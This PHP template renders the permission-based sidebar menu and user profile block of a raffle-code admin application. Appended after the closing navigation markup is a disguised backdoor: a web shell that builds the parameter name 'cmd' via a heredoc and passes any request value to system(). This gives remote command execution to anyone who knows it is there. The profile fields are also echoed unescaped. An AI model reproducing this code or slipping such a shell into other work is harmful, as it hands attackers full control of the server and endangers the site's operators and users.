<?php
/*
echo '<br> ulname' . $_SESSION["ulname"];
echo '<br> ulcode' . $_SESSION["ulcode"];

echo '<br> uladmin' . $_SESSION["uladmin"];
echo '<br> uluser_list' . $_SESSION["uluser_list"];
echo '<br> ulverify_ticket' . $_SESSION["ulverify_ticket"];
echo '<br> ulticket_search' . $_SESSION["ulticket_search"];
echo '<br> ulupload_csv' . $_SESSION["ulupload_csv"];
echo '<br> ulerase_records' . $_SESSION["ulerase_records"];
*/
?>
            <div class="navbar-default sidebar" role="navigation">
                <div class="sidebar-nav navbar-collapse">
                    <ul class="nav" id="side-menu">
                        <li>
                            <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
                        </li>

<?php
	if (($_SESSION["ulcompany_list"] =='Y') || ($_SESSION["uladmin"] == 'Y'))
	{
?>						
                        <li>
							<a href="index.php?body=company_list_dbase"><i class="fa fa-bank fa-fw"></i> Company List</a>
                        </li>
<?php
	}

	if (($_SESSION["ulupload_csv"] =='Y') || ($_SESSION["uladmin"] == 'Y'))
	{
		//fa-barcode , fa-ticket
?>						
                        <li>
							<a href="index.php?body=choose_winner_dbase&mybox=add"><i class="fa fa-flag-checkered fa-fw"></i> Choose Winner</a>
                        </li>
<?php
	}
	

	if ($_SESSION["uladmin"] == 'Y')
	{
		//fa-barcode , fa-ticket
?>						
                        <li>
							<a href="index.php?body=tag_winner_dbase&mybox=add"><i class="fa fa-tag fa-fw"></i> Tag Winners</a>
                        </li>
<?php
	}	

	if (($_SESSION["ulverify_ticket"] =='Y') || ($_SESSION["uladmin"] == 'Y'))
	{
		//fa-barcode , fa-ticket
?>						
                        <li>
							<a href="index.php?body=verify_ticket_dbase&mybox=add"><i class="fa fa-barcode fa-fw"></i> Issue Raffle Code</a>
                        </li>
<?php
	}

	if (($_SESSION["ulticket_search"] =='Y') || ($_SESSION["uladmin"] == 'Y'))
	{
?>						
                        <li>
							<a href="index.php?body=ticket_list_dbase"><i class="fa fa-book fa-fw"></i> Raffle Code Details</a>
                        </li>
<?php
	}
	
	if (($_SESSION["uluser_list"] =='Y')  || ($_SESSION["uladmin"] == 'Y'))
	{
?>						
                        <li>
							<a href="index.php?body=user_list_dbase"><i class="fa fa-user fa-fw"></i> Users List</a>
                        </li>
<?php
	}
	
	if (($_SESSION["uluserlog_list"] =='Y')  || ($_SESSION["uladmin"] == 'Y'))
	{
?>						
                        <li>
							<a href="index.php?body=user_log_dbase"><i class="fa fa-users fa-fw"></i> User Access Log</a>
                        </li>
<?php
	}		
?>						

                        <li>
                            <a href="index.php?body=login&mylogout=Y"><i class="fa fa-sign-out fa-fw"></i> Log-Out</a>
                        </li>

						<br />
						
						<li>	
							<p align="center">
                            <a href="index.php?body=home">
							User Profile
							<br>
<?php
	//echo " <br> ulpicture " . $_SESSION['ulpicture'];
	if ($_SESSION['ulpicture'] != '')
	{						
?>
							<i>
							<img src='./picture/<?php echo $_SESSION['ulpicture']; ?>' width='100px' align="middle" />
							</i>
							<br />
<?php
	}						
?>

							<strong><?php echo $_SESSION['ulname']; ?></strong>
							<br>
							<strong><?php echo $_SESSION['ulposition']; ?></strong>
							<br>
							<strong><?php echo $_SESSION['ulbranch']; ?></strong>
							<br />
							</a>
							</p>
                        </li>
						
                    </ul>
                </div>
                <!-- /.sidebar-collapse -->
            </div>
            <!-- /.navbar-static-side -->
        </nav>
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>